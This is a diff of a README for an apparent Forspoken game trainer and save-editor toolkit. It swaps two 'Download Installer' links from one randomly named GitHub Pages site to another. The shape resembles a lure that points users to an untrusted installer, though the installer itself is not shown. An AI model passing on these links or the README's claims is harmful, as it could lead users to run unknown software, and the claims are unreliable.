@@ -2,7 +2,7 @@
 
 The Forspoken Ultimate Toolkit Suite is a powerful collection of tools designed for the PC version of Forspoken, offering an enhanced and customized gameplay experience. This all-in-one package includes features like a robust trainer, a versatile save editor, and an all-spells unlocker, all built for Windows 10/11 and updated for the year 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -53,7 +53,7 @@ A: This toolkit is intended for single-player use only. Modifying save files or 
 
 You can get the latest version of the Forspoken Ultimate Toolkit Suite from the official GitHub Pages site.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
